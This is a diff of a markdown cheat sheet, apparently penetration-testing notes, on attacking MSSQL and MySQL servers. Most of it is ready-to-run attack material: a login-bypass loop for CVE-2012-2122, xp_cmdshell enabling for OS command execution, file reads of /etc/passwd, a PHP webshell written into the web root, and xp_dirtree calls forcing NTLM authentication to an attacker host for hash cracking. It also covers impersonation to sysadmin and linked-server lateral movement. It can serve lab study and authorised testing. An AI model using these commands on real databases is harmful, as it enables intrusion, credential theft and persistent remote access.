@@ -1,231 +1,158 @@
-## Initial Enumeration
+# Attacking SQL Databases
 
-Symptom: Identifying database services on standard or non-standard ports. MSSQL defaults to **TCP/1433** and **UDP/1434**, or **TCP/2433** when hidden; MySQL defaults to **TCP/3306**.
+MSSQL on TCP/1433 (hidden: TCP/2433). MySQL on TCP/3306. Nmap `-sC` pulls version, hostname, domain from MSSQL NTLM info banner.
 
-Banner grabbing and script-based enumeration:
+---
 
-```
-nmap -Pn -sV -sC -p<PORT> <TARGET_IP>
-```
+## Connect
 
-**Dangerous / misconfigured settings**
+MSSQL from Linux:
 
-- MSSQL running in **hidden mode** on **TCP/2433**.
-- **Anonymous access** enabled or users configured with **no password**.
-
-## Connecting to SQL Services
-
-Symptom: Valid credentials obtained for a target database service.
-
-Connect to MySQL/MariaDB:
-
-```
-mysql -u <USERNAME> -p<PASSWORD> -h <TARGET_IP>
+```bash
+mssqlclient.py -p 1433 <USER>@<TARGET>
+sqsh -S <TARGET> -U <USER> -P '<PASS>' -h
 ```
 
-Connect to MSSQL via sqlcmd with adjusted output width:
+MSSQL Windows auth from Linux (local account):
 
-```
-sqlcmd -S <TARGET_IP> -U <USERNAME> -P '<PASSWORD>' -y 30 -Y 30
-```
-
-Connect to MSSQL via sqsh with Windows Authentication:
-
-```
-sqsh -S <TARGET_IP> -U <DOMAIN>\<USERNAME> -P '<PASSWORD>' -h
+```bash
+sqsh -S <TARGET> -U .\\<USER> -P '<PASS>' -h
 ```
 
-**Tool comparison**
+MySQL from Linux:
 
-- sqlcmd -> `sqlcmd -S <TARGET_IP> -U <USERNAME> -P <PASSWORD>` -> native Windows CLI; use `-y/-Y` for output formatting.
-- sqsh -> `sqsh -S <TARGET_IP> -U <USERNAME> -P <PASSWORD>` -> Linux-based; use `-h` to disable headers for clean output.
-
-**Gotchas**
-
-- **Authentication failure** occurs if the domain/hostname is omitted when attempting **Windows Authentication**; it defaults to SQL Authentication.
-
-## MySQL Authentication Bypass
-
-Symptom: Targeting MySQL 5.6.x or similar where a **timing attack** vulnerability (CVE-2012-2122) exists.
-
-Bypass login by repeatedly sending an incorrect password until the server fails to validate correctly:
-
-```
-for i in {1..1000}; do mysql -u <USERNAME> -p<PASSWORD> -h <TARGET_IP> -e "status" 2>/dev/null && break; done
+```bash
+mysql -u <USER> -p<PASS> -h <TARGET>
 ```
 
-**Gotchas**
+---
 
-- **Bypass failure** if the specific race condition/timing vulnerability is not present in the target version.
+## Basic Enumeration Queries
 
-## Database and Table Enumeration
+MySQL:
 
-Symptom: Initial access established; need to locate **PII**, **credentials**, or **configuration** data.
-
-List MySQL databases:
-
-```
+```sql
 SHOW DATABASES;
-```
-
-List MSSQL databases:
-
-```
-SELECT name FROM master.dbo.sysdatabases;
-GO
-```
-
-List MySQL tables in a specific database:
-
-```
-USE <SERVICE_NAME>;
+USE <DB>;
 SHOW TABLES;
+SELECT * FROM <TABLE>;
 ```
 
-List MSSQL tables using INFORMATION_SCHEMA:
+MSSQL (append `GO` after each statement):
 
-```
-SELECT table_name FROM <SERVICE_NAME>.INFORMATION_SCHEMA.TABLES;
+```sql
+SELECT name FROM master.dbo.sysdatabases
+GO
+SELECT table_name FROM <DB>.INFORMATION_SCHEMA.TABLES
+GO
+SELECT * FROM <TABLE>
 GO
 ```
 
-**Gotchas**
+---
 
-- **Permission denied** error occurs when attempting to list or connect to a database without sufficient user privileges.
+## MSSQL Command Execution
 
-## RCE via MSSQL xp_cmdshell
+Enable and use `xp_cmdshell`:
 
-Symptom: **sysadmin** privileges (or equivalent) held on MSSQL; need OS-level command execution.
-
-Enable advanced options and xp_cmdshell:
-
-```
-EXECUTE sp_configure 'show advanced options', 1;
-RECONFIGURE;
-EXECUTE sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
+```sql
+EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+GO
+xp_cmdshell 'whoami'
 GO
 ```
 
-Execute OS commands:
+---
 
-```
-xp_cmdshell '<COMMAND>';
+## File Read / Write
+
+MSSQL — read any file the service account can access:
+
+```sql
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 GO
 ```
 
-> ⚠️ Gap: Command execution will fail if the MSSQL service account lacks permissions to execute `cmd.exe` or if EDR blocks the spawned process.
+MySQL — read (requires FILE priv + `secure_file_priv` empty):
 
-## RCE via MySQL File Write
-
-Symptom: MySQL **FILE** privilege held and **secure_file_priv** is disabled/empty; targeting a web server directory.
-
-Check secure_file_priv status:
-
-```
-show variables like "secure_file_priv";
+```sql
+SELECT LOAD_FILE("/etc/passwd");
 ```
 
-Write a PHP webshell to the webroot:
+MySQL — write webshell (if web root is writable and `secure_file_priv` is empty):
 
-```
-SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '<FILE_PATH>';
-```
-
-**Dangerous / misconfigured settings**
-
-- **secure_file_priv** set to empty, allowing unrestricted read/write access via SQL.
-
-## RCE via MSSQL Ole Automation
-
-Symptom: Admin privileges held on MSSQL; **xp_cmdshell** is restricted or monitored, but file write is possible.
-
-Enable Ole Automation Procedures:
-
-```
-sp_configure 'show advanced options', 1;
-RECONFIGURE;
-sp_configure 'Ole Automation Procedures', 1;
-RECONFIGURE;
-GO
+```sql
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 ```
 
-Write a file to the filesystem:
+Check `secure_file_priv` first:
 
+```sql
+SHOW VARIABLES LIKE "secure_file_priv";
 ```
-DECLARE @OLE INT;
-DECLARE @FileID INT;
-EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
-EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<FILE_PATH>', 8, 1;
-EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<DATA>';
-EXECUTE sp_OADestroy @FileID;
-EXECUTE sp_OADestroy @OLE;
-GO
-```
+
+---
 
 ## MSSQL Hash Stealing
 
-Symptom: Need to capture the MSSQL **service account hash** for offline cracking or NTLM relay.
+Force MSSQL service account to authenticate to your SMB listener:
 
-Trigger NTLM authentication via xp_dirtree:
-
-```
-EXEC master..xp_dirtree '\<ATTACK_IP>\<SHARE_NAME>';
+```sql
+EXEC master..xp_dirtree '\\<ATTACK_HOST>\share\'
 GO
 ```
 
-Trigger NTLM authentication via xp_subdirs:
+Catch with Responder or impacket-smbserver → NTLMv2 hash → hashcat mode 5600.
 
-```
-EXEC master..xp_subdirs '\<ATTACK_IP>\<SHARE_NAME>';
+---
+
+## MSSQL Impersonation
+
+Find impersonatable logins:
+
+```sql
+SELECT distinct b.name FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
 GO
 ```
 
-**Tool comparison**
+Check current role:
 
-- Responder -> `sudo responder -I <INTERFACE>` -> use for capturing and analyzing hashes.
-- impacket-smbserver -> `sudo impacket-smbserver <SHARE_NAME> ./ -smb2support` -> use for capturing hashes when a simple SMB listener is sufficient.
-
-## MSSQL Context Impersonation
-
-Symptom: Current user is not a **sysadmin**, but has **IMPERSONATE** permissions on a high-privileged user.
-
-Identify users available for impersonation:
-
-```
-SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+```sql
+SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')
 GO
 ```
 
-Impersonate the 'sa' user:
+Impersonate sysadmin user:
 
-```
-EXECUTE AS LOGIN = 'sa';
+```sql
+EXECUTE AS LOGIN = 'sa'
+SELECT IS_SRVROLEMEMBER('sysadmin')
 GO
 ```
 
-**Edge cases**
+Revert: `REVERT`
 
-- Use `USE master` before impersonating; the target user may lack access to the current database, causing an **authentication error**.
+> [!tip] Run `EXECUTE AS LOGIN` from the `master` DB — all users have access there. If impersonating in another DB fails with a permissions error, `USE master` first.
+
+---
 
 ## MSSQL Linked Servers
 
-Symptom: Current MSSQL instance has **linked servers** configured, potentially allowing lateral movement.
+Enumerate linked servers (`isremote=0` = linked, `1` = remote):
 
-Identify linked/remote servers:
-
-```
-SELECT srvname, isremote FROM sysservers;
+```sql
+SELECT srvname, isremote FROM sysservers
 GO
 ```
 
-Execute commands on the linked server as **sysadmin** (if configured with high-priv credentials):
+Execute on linked server:
 
-```
-EXECUTE('<COMMAND>') AT [<PIVOT_IP>\<SERVICE_NAME>];
+```sql
+EXECUTE('select @@servername, system_user, is_srvrolemember(''sysadmin'')') AT [<LINKED_SERVER>]
 GO
 ```
 
-**Gotchas**
-
-- **Syntax error** occurs if single quotes are not escaped using double single quotes (`''`) when passing commands through the `EXECUTE` statement.
+Linked server sysadmin → `xp_cmdshell` on the remote instance → lateral movement.
